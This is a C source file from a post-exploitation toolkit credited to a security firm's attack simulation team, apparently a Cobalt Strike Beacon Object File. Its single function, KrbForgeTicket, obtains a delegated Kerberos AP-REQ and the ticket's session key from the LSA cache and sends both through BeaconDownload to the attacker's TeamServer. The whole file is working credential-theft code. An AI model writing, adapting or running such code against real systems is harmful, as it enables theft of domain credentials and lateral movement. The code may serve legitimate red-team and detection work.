/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( LsaLookupAuthenticationPackage );
	D_API( LsaCallAuthenticationPackage );
	D_API( InitializeSecurityContextW );
	D_API( AcquireCredentialsHandleA );
	D_API( LsaDeregisterLogonProcess );
	D_API( DeleteSecurityContext );
	D_API( FreeCredentialsHandle );
	D_API( RtlInitUnicodeString );
	D_API( LsaConnectUntrusted );
	D_API( LsaFreeReturnBuffer );
	D_API( RtlInitAnsiString );
	D_API( FreeContextBuffer );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
} API ;

/* Macros */
#ifndef SEC_SUCCESS
#define SEC_SUCCESS( Status )	( ( Status ) >= 0 )
#endif

/*!
 *
 * Purpose:
 *
 * Forges a ticket to the DC using the specified 
 * encryption algorithm. Downloads the Key and
 * APREQ to a file on TeamServer.
 *
!*/
BOOL KrbForgeTicket( _In_ PWCHAR ServicePrincipalName, _In_ ULONG EncryptionType, _In_ PCHAR ApReqFileName, _In_ PCHAR KeyFileName )
{
	API				Api;
	SecBuffer			Buf;
	CtxtHandle			Ctx;
	TimeStamp			Tim;
	CredHandle			Crh;
	ANSI_STRING			Ani;
	SecBufferDesc			Sbd;
	UNICODE_STRING			Uni;

	NTSTATUS			Nst = 0;
	ULONG				RLn = 0;
	ULONG				Att = 0;
	ULONG				Kid = 0;
	BOOLEAN				Ret = FALSE;
	SECURITY_STATUS			Scs = SEC_E_OK;

	HANDLE				Ntl = NULL;
	HANDLE				Lsa = NULL;
	HANDLE				S32 = NULL;
	PKERB_RETRIEVE_TKT_REQUEST	Rtq = NULL;
	PKERB_RETRIEVE_TKT_RESPONSE	Rta = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Tim, sizeof( Tim ) );
	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Sbd, sizeof( Sbd ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Reference ntdll.dll */
	Ntl = LoadLibraryA( "ntdll.dll" );

	if ( Ntl != NULL ) {

		Api.RtlInitUnicodeString = C_PTR( GetProcAddress( Ntl, "RtlInitUnicodeString" ) ); 
		Api.RtlInitAnsiString    = C_PTR( GetProcAddress( Ntl, "RtlInitAnsiString" ) );
		Api.RtlAllocateHeap      = C_PTR( GetProcAddress( Ntl, "RtlAllocateHeap" ) );
		Api.RtlFreeHeap          = C_PTR( GetProcAddress( Ntl, "RtlFreeHeap" ) );

		/* Reference secur32.dll */
		S32 = LoadLibraryA( "secur32.dll" );

		if ( S32 != NULL ) {
			/* Build Stack API Table */
			Api.LsaLookupAuthenticationPackage = C_PTR( GetProcAddress( S32, "LsaLookupAuthenticationPackage" ) );
			Api.LsaCallAuthenticationPackage   = C_PTR( GetProcAddress( S32, "LsaCallAuthenticationPackage" ) );
			Api.InitializeSecurityContextW     = C_PTR( GetProcAddress( S32, "InitializeSecurityContextW" ) );
			Api.AcquireCredentialsHandleA      = C_PTR( GetProcAddress( S32, "AcquireCredentialsHandleA" ) );
			Api.LsaDeregisterLogonProcess      = C_PTR( GetProcAddress( S32, "LsaDeregisterLogonProcess" ) );
			Api.DeleteSecurityContext          = C_PTR( GetProcAddress( S32, "DeleteSecurityContext" ) );
			Api.FreeCredentialsHandle          = C_PTR( GetProcAddress( S32, "FreeCredentialsHandle" ) );
			Api.LsaConnectUntrusted            = C_PTR( GetProcAddress( S32, "LsaConnectUntrusted" ) );
			Api.LsaFreeReturnBuffer            = C_PTR( GetProcAddress( S32, "LsaFreeReturnBuffer" ) );
			Api.FreeContextBuffer              = C_PTR( GetProcAddress( S32, "FreeContextBuffer" ) );

			/* Acquire a handle to the kerberos name */
			if ( SEC_SUCCESS( ( Scs = Api.AcquireCredentialsHandleA( NULL, MICROSOFT_KERBEROS_NAME_A, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &Crh, &Tim ) ) ) ) {
				/* Set SecBuffer output information */
				Buf.cbBuffer   = 0;
				Buf.pvBuffer   = NULL;
				Buf.BufferType = SECBUFFER_TOKEN;
				Sbd.ulVersion  = SECBUFFER_VERSION;
				Sbd.cBuffers   = 1;
				Sbd.pBuffers   = C_PTR( & Buf );

				/* Attempt to initialize the security context handle */
				if ( SEC_SUCCESS( ( Scs = Api.InitializeSecurityContextW( &Crh, NULL, ServicePrincipalName, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &Ctx, &Sbd, &Att, NULL ) ) ) ) {
					/* Did we succeed in delegation? */
					if ( Att & ISC_REQ_DELEGATE ) {
						/* Connect to Lsa untrusted */
						if ( NT_SUCCESS( Api.LsaConnectUntrusted( &Lsa ) ) ) {  
							Api.RtlInitAnsiString( &Ani, MICROSOFT_KERBEROS_NAME_A );

							/* Open up the kerberos package */
							if ( NT_SUCCESS( Api.LsaLookupAuthenticationPackage( Lsa, &Ani, &Kid ) ) ) {

								/* Parse string into the string info */
								Api.RtlInitUnicodeString( &Uni, ServicePrincipalName );

								/* Allocates a buffer to hold the request */
								if ( ( Rtq = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( KERB_RETRIEVE_TKT_REQUEST ) + Uni.MaximumLength ) ) != NULL ) {

									/* Build the KERBEROS_RETRIEVE_TKT_REQUEST */
									Rtq->MessageType              = KerbRetrieveEncodedTicketMessage;
									Rtq->CacheOptions             = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
									Rtq->EncryptionType           = EncryptionType;
									Rtq->TargetName.Buffer        = C_PTR( U_PTR( Rtq ) + sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
									Rtq->TargetName.Length        = Uni.Length;
									Rtq->TargetName.MaximumLength = Uni.MaximumLength; 

									/* Copy over the original string */
									__builtin_memcpy( Rtq->TargetName.Buffer , ServicePrincipalName, Uni.MaximumLength );

									/* Retrieve the KERBEROS_RETRIEVE_TKT_RESPONSE */
									if ( NT_SUCCESS( Api.LsaCallAuthenticationPackage( Lsa, Kid, Rtq, sizeof( KERB_RETRIEVE_TKT_REQUEST ) + Uni.MaximumLength, &Rta, &RLn, &Nst ) ) ) {
										if ( NT_SUCCESS( Nst ) ) {

											/* Download the APREQ to a file */
											BeaconDownload( Buf.pvBuffer, Buf.cbBuffer, ApReqFileName );

											/* Download session key to a filename */
											BeaconDownload( Rta->Ticket.SessionKey.Value, Rta->Ticket.SessionKey.Length, KeyFileName );

											/* Status */
											Ret = TRUE;
										};
										Api.LsaFreeReturnBuffer( Rta );
									};

									/* Free the memory for the request */
									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rtq );
								};
							};
							/* Close the reference! */
							Api.LsaDeregisterLogonProcess( Lsa );
						};
					};
					/* Free the context buffer and security context */
					Api.FreeContextBuffer( Buf.pvBuffer );
					Api.DeleteSecurityContext( &Ctx );
				};

				/* Free the kerberos name */
				Api.FreeCredentialsHandle( &Crh );
			};
			/* Dereference */
			FreeLibrary( S32 );
		};
		/* Dereference ntdll.dll */
		FreeLibrary( Ntl );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Tim, sizeof( Tim ) );
	RtlSecureZeroMemory( &Crh, sizeof( Crh ) );
	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
	RtlSecureZeroMemory( &Sbd, sizeof( Sbd ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Status */
	return Ret;
};
